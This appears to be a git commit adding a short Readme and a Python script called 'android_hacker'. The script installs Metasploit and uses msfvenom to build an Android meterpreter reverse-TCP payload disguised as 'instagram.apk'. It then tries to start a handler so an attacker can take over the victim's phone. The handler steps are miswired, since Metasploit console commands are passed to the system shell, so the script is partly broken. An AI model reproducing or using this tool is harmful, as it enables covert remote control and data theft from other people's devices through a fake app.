397b39c3d8118deaae80111527fa3d938996ea75
clicktoinstall <69070384+clicktoinstall@users.noreply.github.com>
2020-08-01 15:26:02 +0530

    Add files via upload

---
+++ Readme.txt
@@ -0,0 +1,4 @@
+How to install 
+
+Step-1:install python3
+Step-2:Type : python3 android_hacker
---
+++ android_hacker.py
@@ -0,0 +1,29 @@
+#!usr/bin/evn python3
+
+import subprocess
+
+interface = input("what's your os  linux give sudo , termux give enter ==>")
+
+os = input("what's your os  linux give -framework , termux give enter ==>")
+
+subprocess.call(interface +  " apt install unstable-repo", shell=True)
+
+subprocess.call(interface +  " apt install metasploit" + os , shell=True)
+
+lhost = input("what is your IP Address ==>")
+
+lport = input("what is your PORT ==>")
+
+subprocess.call(" msfvenom -p android/meterpreter/reverse_tcp LHOST=" + lhost + " LPORT=" + lport + " R >instagram.apk", shell=True)
+
+subprocess.call(" msfconsole", shell=True)
+
+subprocess.call("use exploit/multi/handler", shell=True)
+
+subprocess.call("set payload android/meterpreter/reverse_tcp ", shell=True)
+
+subprocess.call("set LHOST " + lhost, shell=True)
+
+subprocess.call("set LPORT " + lport, shell=True)
+
+subprocess.call("exploit", shell=True)
